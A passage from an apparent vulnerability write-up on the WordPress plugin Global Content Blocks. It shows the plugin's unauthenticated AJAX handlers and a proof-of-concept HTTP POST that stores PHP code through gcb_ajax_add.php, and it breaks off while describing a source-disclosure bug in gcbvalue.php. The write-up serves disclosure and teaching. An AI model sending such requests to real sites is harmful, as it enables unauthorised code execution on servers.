data-line="crayon-53c9878a69a8a525589573-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-14">14</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-16">16</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-18">18</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-20">20</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-22">22</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-24">24</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-26">26</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-28">28</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-30">30</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-32">32</div><div class="crayon-num" data-line="crayon-53c9878a69a8a525589573-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a8a525589573-34">34</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69a8a525589573-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-2"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"name"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"content"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid call!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-6"><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"name"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-7"><span class="crayon-sy">$</span><span class="crayon-v">description</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'description'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-8"><span class="crayon-sy">$</span><span class="crayon-v">type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'type'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-9"><span class="crayon-sy">$</span><span class="crayon-v">value</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'content'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-10">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-11"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid call!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-12">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-13"><span class="crayon-sy">$</span><span class="crayon-v">available_types</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"other"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"General"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"gcb.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Content block"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"adsense"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Adsense"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"adsense.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Adsense code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"code"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Code"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"code.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Programming code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"form"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Form"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"form.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"General form"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"html"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"HTML"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"html.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Raw HTML code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"iframe"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Iframe"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"iframe.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Iframe code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"optin"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Opt-In Form"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"optin.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Opt-In form code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"php"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"PHP Code"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"php.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"PHP code (without &lt;!--?php, &lt;?, ?--&gt; tags)"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-24"><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"insert into "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"gcb (name,description,value,type) VALUES ('"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">description</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">value</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">type</span><span class="crayon-sy">.</span><span class="crayon-s">"')"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-26"><span class="crayon-sy">$</span><span class="crayon-v">inserted_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_insert_id</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-28"><span class="crayon-sy">$</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-29"><span class="crayon-s">"id"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">inserted_id</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-30"><span class="crayon-s">"name"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-31"><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-v">available_types</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">type</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">"img"</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-32"><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a69a8a525589573-33">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a8a525589573-34"><span class="crayon-e">echo </span><span class="crayon-e">json_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-st">return</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0131 seconds] -->
<p>So it starts by doing some initializations, validate that all the input is there that it needs, and do mostly best-practice sanitization. It then inserts the value into a database and returns the same value back in json format. The problem here is that at no point has the script checked that the calling user is logged in, and is an admin(This is important because it allows for inserting PHP code, which could cause an arbitrary code execution).</p>
<p>It does sanitization of all values but the name, but as it turns out this is all output encoded in the admin interface. But we&#8217;re still able to insert arbitrary content into the table without authentication, which could be bad due to the possibility of PHP code being inserted. This can be exploited like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69a9b307377406" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/global-content-blocks/resources/tinymce/gcb_ajax_add.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 129

name=My malicious request&amp;content=echo 'Hello buddy', nice day';&amp;type=php&amp;description=This is really not malicious code, I swear.</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69a9b307377406-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a9b307377406-2">2</div><div class="crayon-num" data-line="crayon-53c9878a69a9b307377406-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a9b307377406-4">4</div><div class="crayon-num" data-line="crayon-53c9878a69a9b307377406-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69a9b307377406-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69a9b307377406-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-m">global</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">-</span><span class="crayon-i">blocks</span><span class="crayon-o">/</span><span class="crayon-i">resources</span><span class="crayon-o">/</span><span class="crayon-i">tinymce</span><span class="crayon-o">/</span><span class="crayon-v">gcb_ajax_add</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a9b307377406-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a69a9b307377406-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a9b307377406-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">129</span></div><div class="crayon-line" id="crayon-53c9878a69a9b307377406-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69a9b307377406-6"><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-e">My </span><span class="crayon-e">malicious </span><span class="crayon-i">request</span><span class="crayon-o">&amp;</span><span class="crayon-v">content</span><span class="crayon-o">=</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'Hello buddy'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">nice </span><span class="crayon-i">day</span>'<span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-i">php</span><span class="crayon-o">&amp;</span><span class="crayon-v">description</span><span class="crayon-o">=</span><span class="crayon-r">This</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">really </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-e">malicious </span><span class="crayon-i">code</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">I</span><span class="crayon-h"> </span><span class="crayon-v">swear</span><span class="crayon-sy">.</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0033 seconds] -->
<p><strong>Analysis of gdbvalue.php vulnerability</strong><br />
Another part of the admin interface is used to fetch the value of a content block, i.e the php code or other trip of content that may be reused on pages. In cases where it is php code, source code disclosure is a concern. The next 3 vulnerabilities allows for disclosure of block contents. The first one is in [/resources/tinymce/gcbvalue.php](http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/resources/tinymce/gcbvalue.php):</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69aa5801190198" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if(!isset($_POST["id"]) || intval($_POST["id"])get_row("select value from ".$wpdb-&gt;prefix."gcb where id=".$gcb_id);
if($val!==null) {
    echo stripslashes(htmlspecialchars_decode($val-&gt;value));
}
die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a69aa5801190198-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69aa5801190198-2">2</div><div class="crayon-num" data-line="crayon-53c9878a69aa5801190198-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a69aa5801190198-4">4</div><div class="crayon-num" data-line="crayon-53c9878a69aa5801190198-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a69aa5801190198-1"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"id"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-e">intval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"id"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"select value from "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"gcb where id="</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">gcb_id</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69aa5801190198-2"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">val</span><span class="crayon-o">!==</span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878a69aa5801190198-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">echo </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars_decode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">val</span><span class="crayon-o">-&gt;</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a69aa5801190198-4"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878a69aa5801190198-5"><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p>We see some validation of the input id to prevent SQL injection, and then a SQL query which will be used to print out the value(Code/markup) to the page. There is no validation that the caller is an admin, which means we can fetch the value(Which can be PHP code) with a simple HTTP request</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a69aae568702099" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
